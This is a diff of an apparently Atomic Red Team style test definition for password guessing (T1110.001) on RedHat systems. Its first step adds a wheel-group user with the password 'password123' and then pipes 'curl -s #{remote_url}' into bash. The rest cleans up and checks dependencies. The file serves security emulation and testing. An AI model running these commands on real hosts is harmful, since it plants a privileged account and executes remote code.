@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "06317b98-c894-4bc9-a165-b10c0a3d3595",
+      "id": "ce154f1a-c7a5-4c61-b198-b4714f56dc01",
       "type": "execute-command",
       "data": {
         "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
         "command_type": "bash"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "02d1bf3e-b287-4829-8e57-8072cc26a050",
+      "id": "7eb4b796-ec81-4545-afbe-aa55dea2d0ed",
       "type": "execute-command",
       "data": {
         "command": "userdel -fr art\n",
         "command_type": "bash"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "d631fa54-22f6-4955-a884-4a4ec201f2a1",
+      "id": "a691233e-30e8-455d-b732-e37ff142bf0c",
       "name": "Check dependency 1/1",
       "description": "Check if running on a Redhat based machine.\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "940bb905-2917-4dec-bcb0-bf3dc0cfadf9",
+      "id": "321b279e-0226-4573-9563-2326c6070f9c",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a Redhat based machine.\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "yum update \u0026\u0026 yum install -y openssl sudo curl\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "6610a299-a117-48f7-82d5-b53050c9284c",
+      "id": "e27cd666-20c8-4dae-b1eb-f9480693f889",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a Redhat based machine.\n",
       "type": "execute-command",
@@ -55,44 +55,44 @@
         "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "06317b98-c894-4bc9-a165-b10c0a3d3595",
+      "s": "ce154f1a-c7a5-4c61-b198-b4714f56dc01",
       "p": "on-success",
-      "o": "02d1bf3e-b287-4829-8e57-8072cc26a050"
+      "o": "7eb4b796-ec81-4545-afbe-aa55dea2d0ed"
     },
     {
-      "s": "06317b98-c894-4bc9-a165-b10c0a3d3595",
+      "s": "ce154f1a-c7a5-4c61-b198-b4714f56dc01",
       "p": "on-failure",
-      "o": "02d1bf3e-b287-4829-8e57-8072cc26a050"
+      "o": "7eb4b796-ec81-4545-afbe-aa55dea2d0ed"
     },
     {
-      "s": "d631fa54-22f6-4955-a884-4a4ec201f2a1",
+      "s": "a691233e-30e8-455d-b732-e37ff142bf0c",
       "p": "on-success",
-      "o": "06317b98-c894-4bc9-a165-b10c0a3d3595"
+      "o": "ce154f1a-c7a5-4c61-b198-b4714f56dc01"
     },
     {
-      "s": "d631fa54-22f6-4955-a884-4a4ec201f2a1",
+      "s": "a691233e-30e8-455d-b732-e37ff142bf0c",
       "p": "on-failure",
-      "o": "940bb905-2917-4dec-bcb0-bf3dc0cfadf9"
+      "o": "321b279e-0226-4573-9563-2326c6070f9c"
     },
     {
-      "s": "940bb905-2917-4dec-bcb0-bf3dc0cfadf9",
+      "s": "321b279e-0226-4573-9563-2326c6070f9c",
       "p": "on-success",
-      "o": "6610a299-a117-48f7-82d5-b53050c9284c"
+      "o": "e27cd666-20c8-4dae-b1eb-f9480693f889"
     },
     {
-      "s": "6610a299-a117-48f7-82d5-b53050c9284c",
+      "s": "e27cd666-20c8-4dae-b1eb-f9480693f889",
       "p": "on-failure",
-      "o": "06317b98-c894-4bc9-a165-b10c0a3d3595"
+      "o": "ce154f1a-c7a5-4c61-b198-b4714f56dc01"
     }
   ],
   "tags": [
-    "T1110.001",
-    "atomic-red-team"
+    "T1110",
+    "T1110.001"
   ],
   "input_arguments": [
     {
